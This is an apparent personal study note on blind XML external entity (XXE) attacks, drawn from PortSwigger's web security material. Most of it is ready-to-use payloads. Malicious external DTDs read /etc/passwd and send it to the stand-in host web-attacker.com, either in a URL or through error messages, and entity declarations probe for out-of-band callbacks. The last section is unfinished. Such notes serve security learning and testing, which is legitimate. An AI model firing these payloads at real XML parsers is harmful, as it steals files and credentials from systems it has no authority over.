# Detecting blind [[XXE]] using out-of-band (OAST) techniques

Use HTTP request:
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://bupr-collaborator.web-attacker.com"> ]>
```
Monitor if there any DNS or HTTP requests to your URL.

If entities are blocked, due to input validation, you might be able to use XML parameter entities instead which can be referenced within DTO only.
**Declaration example**:
```xml
<!ENTITY % myparameterentity "my parameter entity value" >
```
**Usage**:
```
%myparameterentity;
```
**Example**:
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
```

# Exploiting blind XXE to exfiltrate data out-of-band
Malicous external DTD:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```
Host it on attacker machine:
`http://web-attacker.com/malicious.dtd`
XXE payload:
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Insert it between `<xml />` definition and first xml tag. No need to use entity inside xml, just DTD.

Data contained newlines won't work because of URL validation, but it's still possible to use `/etc/hostname` or FTP can be used instead of HTTP.

## Exploiting blind XXE to retrieve data via error messages
Malicious external DTD:
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval;
%error;
```
Host it on attacker machine:
`http://web-attacker.com/malicious.dtd`
XXE payload:
```dtd
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```
Insert it between `<xml />` definition and first xml tag. No need to use entity inside xml, just DTD.

## Exploiting blind XXE by repurposing a local DTD
#to-be-continued 
https://portswigger.net/web-security/xxe/blind